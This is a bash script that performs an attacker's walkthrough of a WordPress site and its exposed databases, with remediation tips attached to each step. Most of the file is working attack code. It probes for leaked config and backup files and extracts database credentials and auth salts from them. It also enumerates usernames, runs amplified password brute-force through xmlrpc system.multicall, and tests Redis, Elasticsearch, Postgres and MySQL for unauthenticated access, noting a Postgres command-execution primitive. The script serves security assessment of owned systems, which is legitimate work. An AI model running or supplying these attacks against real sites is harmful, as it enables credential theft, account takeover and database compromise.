#!/usr/bin/env bash
# attack_walk.sh — attacker's-eye walkthrough of exposed_listings + login_surfaces.
#
# AUTHORISED USE ONLY. Run against a CLONE or an asset you own. The --loud steps
# send real brute-force / download traffic and can lock accounts on a live box —
# that is why they are off by default.
#
# Usage:
#   ./attack_walk.sh https://clone.example.com          # read-only recon (safe)
#   ./attack_walk.sh https://clone.example.com --loud   # + noisy/exploit steps
#
# Every step prints its OBJECTIVE (what the attacker is trying to achieve), runs
# the exact request, interprets the result, and ends with the FIX.

set -uo pipefail

TARGET=""; LOUD=""; VERBOSE=""; DB=""; DBHOST=""
USAGE="usage: $0 <url|host> [--loud] [-V|--verbose] [--db | --db-host=HOST]"
for a in "$@"; do
  case "$a" in
    --loud)          LOUD=1 ;;
    -V|--verbose)    VERBOSE=1 ;;
    --db)            DB=1 ;;
    --db-host=*)     DB=1; DBHOST="${a#*=}" ;;
    -h|--help)       echo "$USAGE"; exit 0 ;;
    -*)              echo "unknown option: $a"; echo "$USAGE"; exit 1 ;;
    *)               TARGET="$a" ;;
  esac
done
[ -z "$TARGET" ] && { echo "$USAGE"; exit 1; }
[[ "$TARGET" != http* ]] && TARGET="https://$TARGET"
B="${TARGET%/}"                                  # base, no trailing slash
CURL=(curl -sk --max-time 15 -A "Mozilla/5.0 (attack_walk)")   # -k: clone may be self-signed

hr(){ printf '\n\033[1m━━━ %s ━━━\033[0m\n' "$1"; }
# OBJECTIVE / WHY / FIX are teaching prose — only shown with -V/--verbose.
obj(){ [ -n "$VERBOSE" ] && printf '  OBJECTIVE: %s\n' "$1"; :; }
why(){ [ -n "$VERBOSE" ] && printf '  WHY      : %s\n' "$1"; :; }
fix(){ [ -n "$VERBOSE" ] && printf '  \033[32mFIX      : %s\033[0m\n' "$1"; :; }
hit(){  printf '  \033[31m[HIT ]\033[0m %s\n' "$1"; }   # a real finding (bad)
ok(){   printf '  \033[2m[safe]\033[0m %s\n' "$1"; }    # NOT a finding (good)

code(){ "${CURL[@]}" -o /dev/null -w '%{http_code}' "$1"; }   # HTTP status of a URL

echo "Target: $B   (loud=$([ -n "$LOUD" ] && echo yes || echo no), verbose=$([ -n "$VERBOSE" ] && echo yes || echo no))"
[ -z "$VERBOSE" ] && echo "(tip: add -V for OBJECTIVE/WHY/FIX explanations on each step)"

############################################################################
hr "PHASE A — exposed_listings  (the server leaking raw files)"
############################################################################

# ---- A1: directory listings -------------------------------------------------
hr "A1. Directory-listing sweep"
obj "Find a folder the web server will happily list, so I can browse your filesystem over HTTP."
why "'Index of /' appears when a directory has no index file AND autoindex is on (misconfig)."
for d in / /wp-content/ /wp-content/uploads/ /wp-includes/ /wp-content/upgrade/ \
         /backup/ /backups/ /wp-snapshots/ /old/ /tmp/ ; do
  if "${CURL[@]}" "$B$d" | grep -qi "index of"; then
    hit "$B$d  → directory listing EXPOSED"
  else
    ok "$B$d — no listing"
  fi
done
fix "Apache: 'Options -Indexes'   nginx: 'autoindex off;'  (and don't rely on empty index.html)."

# ---- A2: backup / leftover files -------------------------------------------
hr "A2. Backup & leftover-file probe"
obj "Locate a backup/dump/config file left in the webroot — that is where plaintext DB creds live."
why "A single readable wp-config.php.bak or .sql = credentials without any exploit."
FOUND_SECRET=""
for f in wp-config.php.bak wp-config.php.save wp-config.php.old "wp-config.php~" \
         wp-config.php.txt wp-config.old .env database.sql db.sql dump.sql \
         backup.zip backup.tar.gz site.zip .git/config wp-content/debug.log ; do
  c=$(code "$B/$f")
  if [ "$c" = "200" ]; then
    hit "$B/$f  → HTTP 200 (readable)"
    case "$f" in *config*|*.sql|*.env) FOUND_SECRET="$B/$f" ;; esac
  else
    ok "$f — absent (HTTP $c)"
  fi
done
fix "Move backups OUT of the webroot; deny .bak/.sql/.old/.env/.git at the server; rotate any creds already exposed."

# ---- A3: pull the loot (loud) ----------------------------------------------
if [ -n "$LOUD" ] && [ -n "$FOUND_SECRET" ]; then
  hr "A3. Extract credentials from the leaked file  [LOUD]"
  obj "Prove the leak is game-over by reading the DB credentials straight out of the file."
  why "With DB creds an attacker connects directly, or forges login cookies from the AUTH salts."
  "${CURL[@]}" "$FOUND_SECRET" | grep -Ei "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY|AUTH_SALT" \
    | sed 's/^/    LEAKED > /' || echo "    (no obvious creds in $FOUND_SECRET)"
  fix "This file must not exist in the webroot. Its presence = immediate credential compromise."
elif [ -n "$FOUND_SECRET" ]; then
  printf '\n  (skipping credential extraction from %s — run with --loud to prove it)\n' "$FOUND_SECRET"
fi

############################################################################
hr "PHASE B — login_surfaces  (side doors: xmlrpc + phpMyAdmin + name leaks)"
############################################################################

# ---- B1: xmlrpc alive -------------------------------------------------------
hr "B1. Is xmlrpc.php answering?"
obj "Confirm the XML-RPC endpoint is live — it is a brute-force amplifier and an SSRF/DDoS lever."
why "A GET returns 'XML-RPC server accepts POST requests only' when it's enabled."
XMLRPC_MSG=$("${CURL[@]}" "$B/xmlrpc.php")
if echo "$XMLRPC_MSG" | grep -qi "XML-RPC server accepts POST"; then
  hit "xmlrpc.php is ENABLED"
else
  ok "xmlrpc.php not obviously enabled"
fi

# ---- B2: which xmlrpc methods (multicall / pingback) -----------------------
hr "B2. Enumerate xmlrpc methods"
obj "See if system.multicall (mass brute) and pingback.ping (SSRF/DDoS) are available."
why "system.multicall lets ONE request test hundreds of passwords, dodging simple rate limits."
"${CURL[@]}" -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
  "$B/xmlrpc.php" | grep -oiE "system.multicall|pingback.ping|wp.getUsersBlogs" | sort -u \
  | sed 's/^/    method available > /' || true
fix "Block xmlrpc.php at the server unless Jetpack/mobile truly need it; if needed, disable pingback + rate-limit."

# ---- B3: username enumeration ----------------------------------------------
hr "B3. Username enumeration"
obj "Learn real admin login names, turning blind brute-force into targeted brute-force."
why "WP leaks usernames via the REST API and author archives by default."
USERS=$("${CURL[@]}" "$B/wp-json/wp/v2/users" | grep -oE '"slug":"[^"]+"' | cut -d'"' -f4 | sort -u)
if [ -n "$USERS" ]; then
  hit "wp-json leaked users: $(echo "$USERS" | tr '\n' ' ')"
else
  ok "wp-json/wp/v2/users not leaking"
fi
LOC=$("${CURL[@]}" -I "$B/?author=1" | grep -i "^location:" | grep -oE "author/[^/[:space:]]+")
[ -n "$LOC" ] && hit "?author=1 redirect leaks login: ${LOC#author/}" || ok "?author=1 not leaking"
fix "Block ?author= redirects and restrict/deny /wp-json/wp/v2/users to unauthenticated callers."

# ---- B4: phpMyAdmin exposed -------------------------------------------------
hr "B4. Exposed database UI"
obj "Find a web DB console (phpMyAdmin/Adminer) — a direct GUI into the database."
why "If reachable, weak/leaked creds = full read/write on the DB, no WordPress needed."
for p in phpmyadmin pma dbadmin adminer mysql _phpmyadmin; do
  c=$(code "$B/$p/")
  [ "$c" = "200" ] && hit "$B/$p/  → HTTP 200 (DB UI exposed)" || ok "$p/ — absent (HTTP $c)"
done
fix "Never expose DB UIs to the internet: bind to localhost + SSH-tunnel, or IP-allowlist."

# ---- B5: multicall brute demo (loud) ---------------------------------------
if [ -n "$LOUD" ]; then
  hr "B5. Amplified brute-force via system.multicall  [LOUD]"
  U=$(echo "$USERS" | head -1); U=${U:-admin}
  obj "Show how ONE xmlrpc request tests many passwords against '$U' — the actual attack."
  why "Each <methodCall> inside a multicall is a full login attempt; the server checks them all in one shot."
  PWS=(admin password Password1 admin123 123456 letmein welcome1 wordpress)
  CALLS=""; for p in "${PWS[@]}"; do
    CALLS+="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><array><data><value><string>$U</string></value><value><string>$p</string></value></data></array></value></param></params></methodCall>"
  done
  # Fire one multicall wrapping all the per-password login attempts.
  RESP=$("${CURL[@]}" -H 'Content-Type: text/xml' \
    --data "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>${CALLS}</data></array></value></param></params></methodCall>" \
    "$B/xmlrpc.php")
  if echo "$RESP" | grep -qi "isAdmin\|<name>url</name>\|usersblogs"; then
    hit "A password in the set AUTHENTICATED for '$U' — check the response for the winning cred."
    echo "$RESP" | grep -oiE "isAdmin|blogName|<string>https?://[^<]+" | head | sed 's/^/    /'
  elif echo "$RESP" | grep -qi "faultString"; then
    ok "All ${#PWS[@]} passwords rejected in ONE request (faultCode 403). Point made: no rate-limit tripped."
  else
    ok "multicall may be disabled (good) — response carried no per-call results."
  fi
  fix "Disable xmlrpc or pingback/multicall; enforce strong admin passwords + 2FA + a login-attempt limiter."
else
  printf '\n  (skipping B5 amplified brute demo — run with --loud on the clone to watch it work)\n'
fi

############################################################################
if [ -n "$DB" ]; then
DBH="${DBHOST:-$(echo "$B" | sed -E 's#^https?://##; s#[:/].*##')}"
hr "PHASE C — exposed_databases  (DBs reachable straight over their own port)"
obj "Reach a database on its native port and get in WITHOUT the web app — read/dump, or run OS commands."
why "A DB on the public internet is a finding by itself; trust-mode/weak creds or unauth (redis/ES) = instant access."
printf '  probing DB host: %s\n' "$DBH"

for svc in postgres:5432 mysql:3306 redis:6379 mongodb:27017 elasticsearch:9200; do
  name="${svc%%:*}"; port="${svc##*:}"
  if ! timeout 5 bash -c "echo > /dev/tcp/$DBH/$port" 2>/dev/null; then
    ok "$name/$port — closed/filtered"
    continue
  fi
  hit "$name port $port OPEN on $DBH"

  case "$name" in
    redis)
      # Redis speaks a trivial text protocol; an unauth PING returns +PONG.
      resp=$(timeout 5 bash -c "exec 3<>/dev/tcp/$DBH/6379; printf 'PING\r\n' >&3; head -c 32 <&3" 2>/dev/null)
      if printf '%s' "$resp" | grep -qi PONG; then
        hit "  redis has NO AUTH — anyone who reaches the port can read/write the DB"
        [ -n "$LOUD" ] && command -v redis-cli >/dev/null && \
          redis-cli -h "$DBH" INFO server 2>/dev/null | head -4 | sed 's/^/    proof> /'
      elif printf '%s' "$resp" | grep -qi NOAUTH; then
        ok "  redis requires auth (good)"
      fi
      ;;
    elasticsearch)
      # ES on 9200 is HTTP; unauth cluster info means the whole index is readable.
      es=$("${CURL[@]}" "http://$DBH:9200/" )
      if printf '%s' "$es" | grep -qi "cluster_name\|You Know, for Search"; then
        hit "  elasticsearch is UNAUTH — cluster/data readable over HTTP"
        [ -n "$LOUD" ] && "${CURL[@]}" "http://$DBH:9200/_cat/indices?v" | head -5 | sed 's/^/    proof> /'
      fi
      ;;
    postgres)
      if [ -n "$LOUD" ] && command -v psql >/dev/null; then
        v=$(PGCONNECT_TIMEOUT=5 psql "host=$DBH port=5432 user=postgres dbname=postgres" \
              -tAc "select version();" 2>/dev/null)
        [ -n "$v" ] && hit "  postgres TRUST/no-password login worked → $v" \
                    || ok  "  postgres wants a password (good) — try postgres_login brute separately"
        why "  RCE primitive once in as superuser:  COPY (SELECT '') TO PROGRAM 'id';"
      else
        printf '    (open — run with --loud and psql installed to test trust/no-password login)\n'
      fi
      ;;
    mysql)
      if [ -n "$LOUD" ] && command -v mysql >/dev/null; then
        v=$(mysql -h "$DBH" -u root --connect-timeout=5 -N -e "select version();" 2>/dev/null)
        [ -n "$v" ] && hit "  mysql root/no-password login worked → $v" \
                    || ok  "  mysql wants a password (good)"
      else
        printf '    (open — run with --loud and the mysql client to test root/no-password login)\n'
      fi
      ;;
    mongodb)
      printf '    (open — verify unauth access with: mongosh "mongodb://%s:27017" --eval "db.adminCommand({listDatabases:1})")\n' "$DBH"
      ;;
  esac
done
fix "Bind DBs to localhost (listen_addresses='localhost'), firewall the port; never 'trust' / 0.0.0.0; strong unique password; non-superuser app role kills COPY..PROGRAM RCE. Docker: no '-p 5432:5432'."
fi

############################################################################
if [ -n "$VERBOSE" ]; then
hr "DONE — remediation summary"
cat <<'EOF'
  exposed_listings : Options -Indexes / autoindex off; backups out of webroot; deny .bak/.sql/.env/.git; rotate leaked creds.
  login_surfaces   : block/limit xmlrpc.php; kill username enumeration; take phpMyAdmin off the internet; strong passwords + 2FA.
  exposed_databases: bind DB to localhost + firewall the port; never trust/0.0.0.0; strong password; non-superuser role; no docker -p.
  The single highest-value fix: get any leaked wp-config/.sql backup out of the webroot — that one file is 'game over' by itself.
EOF
else
  printf '\n(done — add -V for objectives, explanations, and the remediation summary)\n'
fi
